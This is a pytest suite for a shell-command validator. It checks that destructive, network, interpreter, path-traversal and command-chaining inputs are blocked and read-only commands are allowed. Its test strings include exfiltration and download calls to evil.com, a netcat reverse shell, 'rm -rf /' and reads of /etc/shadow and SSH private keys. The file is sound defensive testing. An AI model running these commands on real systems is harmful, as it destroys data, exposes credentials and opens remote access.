"""
Comprehensive command injection security tests.

These tests verify that the command validation system correctly blocks
various bypass techniques that could be used for code execution or
data exfiltration.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from jpscripts.core.command_validation import (
    CommandVerdict,
    is_command_safe,
    validate_command,
)


@pytest.fixture
def workspace(tmp_path: Path) -> Path:
    """Create a temporary workspace for testing."""
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    return workspace


class TestForbiddenBinaries:
    """Test that forbidden binaries are blocked."""

    @pytest.mark.parametrize(
        "cmd",
        [
            "rm file.txt",
            "rm -rf /",
            "rm -fr .",
            "rmdir empty_dir",
            "mv file1 file2",
            "cp file1 file2",
            "chmod 777 file",
            "chown root file",
            "sudo ls",
            "su -c 'whoami'",
        ],
    )
    def test_destructive_commands_blocked(self, cmd: str, workspace: Path) -> None:
        verdict, reason = validate_command(cmd, workspace)
        assert verdict == CommandVerdict.BLOCKED_FORBIDDEN, f"Should block: {cmd}"
        assert "Forbidden binary" in reason

    @pytest.mark.parametrize(
        "cmd",
        [
            "python3 -c 'print(1)'",
            "perl -e 'hello'",
            "ruby -e 'puts 1'",
            "node -e 'process.exit(0)'",
            "sh -c 'echo hello'",
            "bash -c 'echo pwned'",
            "zsh -c 'echo pwned'",
        ],
    )
    def test_interpreter_execution_blocked(self, cmd: str, workspace: Path) -> None:
        verdict, _reason = validate_command(cmd, workspace)
        assert verdict == CommandVerdict.BLOCKED_FORBIDDEN, f"Should block interpreter: {cmd}"

    @pytest.mark.parametrize(
        "cmd",
        [
            "curl http://evil.com/exfil?data=secret",
            "wget http://evil.com/malware.sh",
            "nc -e /bin/sh evil.com 4444",
            "ssh user@evil.com",
            "scp file user@evil.com:",
        ],
    )
    def test_network_commands_blocked(self, cmd: str, workspace: Path) -> None:
        verdict, _reason = validate_command(cmd, workspace)
        assert verdict == CommandVerdict.BLOCKED_FORBIDDEN, f"Should block network: {cmd}"


class TestFullPathBypass:
    """Test that full path binaries are blocked."""

    @pytest.mark.parametrize(
        "cmd",
        [
            "/bin/rm file.txt",
            "/usr/bin/rm -rf /",
            "/sbin/chmod 777 file",
            "/usr/local/bin/python -c 'print(1)'",
            "./rm file.txt",  # Relative path to rm
            "../bin/rm file.txt",
        ],
    )
    def test_full_path_bypass_blocked(self, cmd: str, workspace: Path) -> None:
        verdict, _reason = validate_command(cmd, workspace)
        assert verdict == CommandVerdict.BLOCKED_FORBIDDEN, f"Should block full path: {cmd}"


class TestShellMetacharacters:
    """Test that shell metacharacters are blocked."""

    @pytest.mark.parametrize(
        "cmd",
        [
            "ls; rm -rf /",
            "cat file | rm",
            "echo pwned && rm -rf /",
            "ls || rm -rf /",
            "echo `rm -rf /`",
            "cat file > /etc/passwd",
            "cat file >> /etc/passwd",
            "rm < input_file",
        ],
    )
    def test_command_chaining_blocked(self, cmd: str, workspace: Path) -> None:
        verdict, reason = validate_command(cmd, workspace)
        assert verdict == CommandVerdict.BLOCKED_METACHAR, f"Should block metachar: {cmd}"
        assert "metacharacter" in reason.lower()

    def test_command_substitution_blocked(self, workspace: Path) -> None:
        # Command substitution $(cmd) may be blocked for different reasons
        # because shlex parses it into tokens with dangerous flags
        verdict, _reason = validate_command("echo $(rm -rf /)", workspace)
        # Either caught as metachar OR as dangerous flag after parsing
        assert verdict in {
            CommandVerdict.BLOCKED_METACHAR,
            CommandVerdict.BLOCKED_DANGEROUS_FLAG,
            CommandVerdict.BLOCKED_FORBIDDEN,
        }, f"Should be blocked: got {verdict}"


class TestPathTraversal:
    """Test that path traversal is blocked."""

    @pytest.mark.parametrize(
        "cmd",
        [
            "cat ../../../etc/passwd",
            "cat ../../../../etc/shadow",
            "ls ../..",
            "head -n 10 ../../secret.txt",
            "cat /etc/passwd",  # Absolute path outside workspace
            "cat /root/.ssh/id_rsa",
        ],
    )
    def test_path_traversal_blocked(self, cmd: str, workspace: Path) -> None:
        verdict, reason = validate_command(cmd, workspace)
        assert verdict == CommandVerdict.BLOCKED_PATH_ESCAPE, f"Should block traversal: {cmd}"
        assert "escape" in reason.lower() or "workspace" in reason.lower()


class TestDangerousFlags:
    """Test that dangerous flags are blocked."""

    @pytest.mark.parametrize(
        "cmd",
        [
            "find . -exec rm {} \\;",
            "find . --exec cat {} \\;",
        ],
    )
    def test_dangerous_flags_blocked(self, cmd: str, workspace: Path) -> None:
        verdict, _reason = validate_command(cmd, workspace)
        assert verdict in {
            CommandVerdict.BLOCKED_DANGEROUS_FLAG,
            CommandVerdict.BLOCKED_METACHAR,
        }, f"Should block flag: {cmd}"

    @pytest.mark.parametrize(
        "cmd,binary",
        [
            ("rm -f file.txt", "rm"),
            ("rm --force file.txt", "rm"),
            ("rm -rf /", "rm"),
        ],
    )
    def test_context_dangerous_flags_blocked(self, cmd: str, binary: str, workspace: Path) -> None:
        verdict, _reason = validate_command(cmd, workspace)
        assert verdict in {
            CommandVerdict.BLOCKED_FORBIDDEN,
            CommandVerdict.BLOCKED_DANGEROUS_FLAG,
        }, f"Should block: {cmd}"


class TestGitSubcommands:
    """Test that git subcommands are properly validated."""

    @pytest.mark.parametrize(
        "cmd",
        [
            "git status",
            "git status --short",
            "git diff",
            "git diff HEAD~1",
            "git log --oneline -10",
            "git log --format='%H %s'",
            "git branch -a",
            "git show HEAD",
            "git ls-files",
            "git rev-parse HEAD",
            "git describe --tags",
            "git blame file.py",
        ],
    )
    def test_safe_git_commands_allowed(self, cmd: str, workspace: Path) -> None:
        verdict, reason = validate_command(cmd, workspace)
        assert verdict == CommandVerdict.ALLOWED, f"Should allow: {cmd}, got {reason}"

    @pytest.mark.parametrize(
        "cmd",
        [
            "git push origin main",
            "git push --force",
            "git pull",
            "git fetch origin",
            "git commit -m 'message'",
            "git add .",
            "git rm file.txt",
            "git reset --hard HEAD~1",
            "git rebase -i HEAD~3",
            "git checkout -b new-branch",
            "git merge feature-branch",
            "git clean -fd",
            "git clone https://github.com/user/repo",
        ],
    )
    def test_dangerous_git_commands_blocked(self, cmd: str, workspace: Path) -> None:
        verdict, _reason = validate_command(cmd, workspace)
        assert verdict == CommandVerdict.BLOCKED_FORBIDDEN, f"Should block git: {cmd}"


class TestAllowedCommands:
    """Test that safe commands are allowed."""

    @pytest.mark.parametrize(
        "cmd",
        [
            "ls",
            "ls -la",
            "ls -la src/",
            "cat README.md",
            "head -n 50 file.txt",
            "tail -f log.txt",
            "grep -r 'pattern' src/",
            "grep -rn 'TODO' .",
            "find . -name '*.py'",
            "find . -type f -name '*.txt'",
            "wc -l file.txt",
            "sort file.txt",
            "uniq file.txt",
            "pwd",
            "which python",
            "tree",
            "tree -L 2",
            "file README.md",
            "stat file.txt",
            "du -sh .",
            "df -h .",
            "echo hello",
            "date",
            "rg 'pattern' src/",
            "fd '*.py'",
            "jq '.key' file.json",
        ],
    )
    def test_safe_commands_allowed(self, cmd: str, workspace: Path) -> None:
        verdict, reason = validate_command(cmd, workspace)
        assert verdict == CommandVerdict.ALLOWED, f"Should allow: {cmd}, got {reason}"


class TestEdgeCases:
    """Test edge cases and unusual inputs."""

    def test_empty_command(self, workspace: Path) -> None:
        verdict, _ = validate_command("", workspace)
        assert verdict == CommandVerdict.BLOCKED_FORBIDDEN

    def test_whitespace_only(self, workspace: Path) -> None:
        verdict, _ = validate_command("   ", workspace)
        assert verdict == CommandVerdict.BLOCKED_FORBIDDEN

    def test_unknown_binary(self, workspace: Path) -> None:
        verdict, reason = validate_command("unknown_binary arg1 arg2", workspace)
        assert verdict == CommandVerdict.BLOCKED_NOT_ALLOWLISTED
        assert "allowlist" in reason.lower()

    def test_quoted_arguments_safe(self, workspace: Path) -> None:
        # Quoted arguments should be handled correctly
        verdict, _ = validate_command("grep 'hello world' file.txt", workspace)
        assert verdict == CommandVerdict.ALLOWED

    def test_quoted_metachar_allowed_inside_quotes(self, workspace: Path) -> None:
        # Metachars inside quotes are checked BEFORE parsing
        # So echo 'hello; rm' will be blocked because ; appears in the raw string
        verdict, _ = validate_command("echo 'hello; rm -rf /'", workspace)
        # The ; is detected in the raw command string before parsing
        assert verdict == CommandVerdict.BLOCKED_METACHAR

    def test_malformed_command(self, workspace: Path) -> None:
        # Unmatched quotes
        verdict, reason = validate_command("cat 'unclosed", workspace)
        assert verdict == CommandVerdict.BLOCKED_UNPARSEABLE
        assert "Unparseable" in reason


class TestConvenienceFunction:
    """Test the is_command_safe convenience function."""

    def test_safe_command(self, workspace: Path) -> None:
        assert is_command_safe("ls -la", workspace) is True

    def test_unsafe_command(self, workspace: Path) -> None:
        assert is_command_safe("rm -rf /", workspace) is False

    def test_path_escape(self, workspace: Path) -> None:
        assert is_command_safe("cat /etc/passwd", workspace) is False
